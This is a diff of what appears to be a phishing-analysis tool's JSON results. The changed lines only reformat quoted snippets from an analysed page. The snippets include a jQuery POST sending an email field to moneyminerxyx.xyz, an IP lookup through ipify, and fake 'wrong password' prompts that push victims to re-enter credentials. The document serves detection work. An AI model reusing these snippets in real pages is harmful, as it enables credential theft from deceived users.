@@ -58,7 +58,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"url\":\"https://www.moneyminerxyx.xyz/dude/post.php\",\"type\":\"POST\",\"data\":{\"email\":\"blah.blah...\n\t\t\t                $.ajax({",
+        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"url\":\"https://www.moneyminerxyx.xyz/dude/post.php\",\"type\":\"POST\",\"data\":{\"email\":\"blah.blah...\n\t\t$.ajax({",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -82,7 +82,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "A domain associated with GeoIP services was observed\n\t\tDomain 'api.ipify.org' is for a GeoIP service.\n",
+        "body": "A domain associated with GeoIP services was observed\n\t\tDomain 'api.ipify.org' is for a GeoIP service.",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -106,7 +106,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request via jQuery\n\t\t$.getJSON(https://api.ipify.org?format=json,function(data){?            userIP = data.ip;?        })...\n\t\t        $.getJSON('https://api.ipify.org?format=json', function(data){",
+        "body": "JavaScript sends a network request via jQuery\n\t\t$.getJSON(https://api.ipify.org?format=json,function(data){?            userIP = data.ip;?        })\n\t\t$.getJSON('https://api.ipify.org?format=json', function(data){",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -130,7 +130,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[34].send()\n",
+        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[34].send()",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -178,7 +178,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript prompts user to re-enter account data.\n\t\t\t                        $('.pwdErr').text('Incorrect Password, Try again')\n\t\t\t                    alert(\"Download Failed! - Wrong password detected, please try again.\")\n\t\t\t                // $('.pwdErr').text('Incorrect Password, Try again')\n\t\t\t                    \t// $('.pwdErr').text('Incorrect Password, Try again')\n\t\t            alert('Download Failed! - Wrong password detected, please try again.!')",
+        "body": "JavaScript prompts user to re-enter account data.\n\t\t$('.pwdErr').text('Incorrect Password, Try again')\n\t\talert(\"Download Failed! - Wrong password detected, please try again.\")\n\t\t// $('.pwdErr').text('Incorrect Password, Try again')\n\t\talert('Download Failed! - Wrong password detected, please try again.!')",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
